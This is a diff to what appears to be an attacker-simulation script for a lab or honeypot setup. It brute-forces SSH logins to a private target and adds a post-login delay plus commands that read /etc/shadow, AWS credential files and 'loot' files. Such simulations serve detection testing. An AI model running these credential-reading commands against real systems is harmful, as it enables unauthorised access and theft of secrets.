@@ -42,6 +42,9 @@ logger = logging.getLogger("attacker.simulate")
 TARGET_HOST = os.getenv("TARGET_HOST", "172.18.0.10")
 TARGET_PORT = int(os.getenv("TARGET_PORT", "2222"))
 WORDLIST_PATH = Path(os.getenv("WORDLIST_PATH", "/attacker/wordlists/passwords.txt"))
+POST_LOGIN_INITIAL_DELAY_SECONDS = float(
+    os.getenv("POST_LOGIN_INITIAL_DELAY_SECONDS", "2.0")
+)
 
 USERNAMES = [
     "root", "admin", "user", "ubuntu", "debian",
@@ -64,6 +67,10 @@ PROFILE_COMMANDS = {
         "cat /etc/passwd",
         "cat /etc/shadow",
         "ls -la /home",
+        "ls -la /home/admin",
+        "ls -la /home/admin/loot",
+        "cat /home/admin/loot/system_audit.txt",
+        "cat /home/admin/.aws/credentials",
         "ps aux",
         "netstat -tulnp",
         "cat /proc/version",
@@ -79,6 +86,9 @@ PROFILE_COMMANDS = {
         "cat /etc/ssh/sshd_config",
         "ls -la /home",
         "ls -la /root",
+        "ls -la /home/admin/loot",
+        "cat /home/admin/loot/system_audit.txt",
+        "cat /home/admin/.aws/credentials",
         "history",
         "cat /proc/version",
         "ifconfig",
@@ -282,6 +292,9 @@ def run_post_exploitation(
         # Flush the initial banner/prompt
         if shell.recv_ready():
             shell.recv(4096)
+
+        if POST_LOGIN_INITIAL_DELAY_SECONDS > 0:
+            time.sleep(POST_LOGIN_INITIAL_DELAY_SECONDS)
 
         for cmd in commands:
             try:
